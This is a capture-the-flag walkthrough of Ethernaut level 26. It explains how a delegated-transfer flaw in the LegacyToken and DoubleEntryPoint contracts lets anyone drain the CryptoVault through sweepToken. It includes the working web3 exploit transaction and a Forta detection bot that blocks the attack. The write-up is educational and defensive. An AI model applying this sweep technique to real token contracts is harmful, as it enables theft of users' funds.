# Level 26: Double Entry Point

This is the level 26 of OpenZeppelin [Ethernaut](https://ethernaut.openzeppelin.com/) web3/solidity based game.

## Pre-requisites
- [Contract ABI Specification](https://docs.soliditylang.org/en/latest/abi-spec.html#contract-abi-specification)

## Hack

Given contracts:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface DelegateERC20 {
  function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
}

interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}

interface IForta {
    function setDetectionBot(address detectionBotAddress) external;
    function notify(address user, bytes calldata msgData) external;
    function raiseAlert(address user) external;
}

contract Forta is IForta {
  mapping(address => IDetectionBot) public usersDetectionBots;
  mapping(address => uint256) public botRaisedAlerts;

  function setDetectionBot(address detectionBotAddress) external override {
      require(address(usersDetectionBots[msg.sender]) == address(0), "DetectionBot already set");
      usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
  }

  function notify(address user, bytes calldata msgData) external override {
    if(address(usersDetectionBots[user]) == address(0)) return;
    try usersDetectionBots[user].handleTransaction(user, msgData) {
        return;
    } catch {}
  }

  function raiseAlert(address user) external override {
      if(address(usersDetectionBots[user]) != msg.sender) return;
      botRaisedAlerts[msg.sender] += 1;
  } 
}

contract CryptoVault {
    address public sweptTokensRecipient;
    IERC20 public underlying;

    constructor(address recipient) public {
        sweptTokensRecipient = recipient;
    }

    function setUnderlying(address latestToken) public {
        require(address(underlying) == address(0), "Already set");
        underlying = IERC20(latestToken);
    }

    /*
    ...
    */

    function sweepToken(IERC20 token) public {
        require(token != underlying, "Can't transfer underlying token");
        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
    }
}

contract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable {
    DelegateERC20 public delegate;

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {
        delegate = newContract;
    }

    function transfer(address to, uint256 value) public override returns (bool) {
        if (address(delegate) == address(0)) {
            return super.transfer(to, value);
        } else {
            return delegate.delegateTransfer(to, value, msg.sender);
        }
    }
}

contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC20, Ownable {
    address public cryptoVault;
    address public player;
    address public delegatedFrom;
    Forta public forta;

    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) public {
        delegatedFrom = legacyToken;
        forta = Forta(fortaAddress);
        player = playerAddress;
        cryptoVault = vaultAddress;
        _mint(cryptoVault, 100 ether);
    }

    modifier onlyDelegateFrom() {
        require(msg.sender == delegatedFrom, "Not legacy contract");
        _;
    }

    modifier fortaNotify() {
        address detectionBot = address(forta.usersDetectionBots(player));

        // Cache old number of bot alerts
        uint256 previousValue = forta.botRaisedAlerts(detectionBot);

        // Notify Forta
        forta.notify(player, msg.data);

        // Continue execution
        _;

        // Check if alarms have been raised
        if(forta.botRaisedAlerts(detectionBot) > previousValue) revert("Alert has been triggered, reverting");
    }

    function delegateTransfer(
        address to,
        uint256 value,
        address origSender
    ) public override onlyDelegateFrom fortaNotify returns (bool) {
        _transfer(origSender, to, value);
        return true;
    }
}
```

`player` has to find the bug in the `CryptoVault` and create a Forta bot to protect it from being drained.

First, let's figure out the exploit that allows to drain the underlying (DET) tokens. If you see the `sweepToken()` method  it can be seen that it restricts sweeping the underlying tokens with a `require` check - as expected. But take a look at `LegacyToken`'s `transfer()` method:
```solidity
if (address(delegate) == address(0)) {
    return super.transfer(to, value);
} else {
    return delegate.delegateTransfer(to, value, msg.sender);
}
```

Looks like it actually calls `delegateTransfer()` method of some `DelegateERC20` contract. But this `DelegateERC20` is nothing but the implementation of the underlying (`DET`) token itself! And `delegateTransfer()` simply transfers the tokens according to given parameters. The only restriction `delegateTransfer()` puts is that `msg.sender` must be the LegacyToken (`delegatedFrom` address) contract.

So we can indirectly sweep the underlying tokens through `transfer()` of `LegacyToken` contract. We simply call `sweepToken` with address of `LegacyToken` contract. That in turn would make the `LegacyContract` to call the `DoubleEntryPoint`'s (DET token) `delegateTransfer()` method. 

```js
vault = await contract.cryptoVault()

// Check initial balance (100 DET)
await contract.balanceOf(vault).then(v => v.toString()) // '100000000000000000000'

legacyToken = await contract.delegatedFrom()

// sweepTokens(..) function call data
sweepSig = web3.eth.abi.encodeFunctionCall({
    name: 'sweepToken',
    type: 'function',
    inputs: [{name: 'token', type: 'address'}]
}, [legacyToken])

// Send exploit transaction
await web3.eth.sendTransaction({ from: player, to: vault, data: sweepSig })

// Check balance (0 DET)
await contract.balanceOf(vault).then(v => v.toString()) // '0'
```

And `CryptoVault` is swept of DET tokens!

This worked because during invocation `transfer()` of `LegacyToken` the `msg.sender` was `CryptoVault`. And when `delegateTransfer()` invoked right after, the `origSender` is the passed in address of `CryptoVault` contract and `msg.sender` is `LegacyToken` so `onlyDelegateFrom` modifier checks out.

Now to prevent this exploit we have to write a bot which would be a simple contract implementing the `IDetectionBot` interface. In the bot's `handleTransaction(..)` we could simply check that the address was not `CryptoVault` address. If so, raise alert. Hence preventing sweep.

Open up Remix and deploy the bot (on Rinkeby) and copy its address.
```solidity
pragma solidity ^0.8.0;

interface IForta {
    function raiseAlert(address user) external;
}

contract FortaDetectionBot {
    address private cryptoVault;

    constructor(address _cryptoVault) {
        cryptoVault = _cryptoVault;
    }

    function handleTransaction(address user, bytes calldata msgData) external {
        // Extract the address of original message sender
        // which should start at offset 168 (0xa8) of calldata
        address origSender;
        assembly {
            origSender := calldataload(0xa8)
        }

        if (origSender == cryptoVault) {
            IForta(msg.sender).raiseAlert(user);
        }
    }
}
```

Note that in the above `FortaDetectionBot` contract we extract the address of the original transaction sender by calculating its offset according to the [ABI encoding](https://docs.soliditylang.org/en/latest/abi-spec.html#argument-encoding) specs.

Now set the bot in `Forta` contract:
```js
// FortaDetectionBot
botAddr = '0x...'

// Forta contract address
forta = await contract.forta()

// setDetectionBot() function call data
setBotSig = web3.eth.abi.encodeFunctionCall({
    name: 'setDetectionBot',
    type: 'function',
    inputs: [
        { type: 'address', name: 'detectionBotAddress' }
    ]
}, [botAddr])

// Send the transaction setting the bot
await web3.eth.sendTransaction({from: player, to: forta, data: setBotSig })
```

That is it!

_Learned something awesome? Consider starring the [github repo](https://github.com/theNvN/ethernaut-openzeppelin-hacks)_ 😄

_and following me on twitter [here](https://twitter.com/the_nvn)_ 🙏

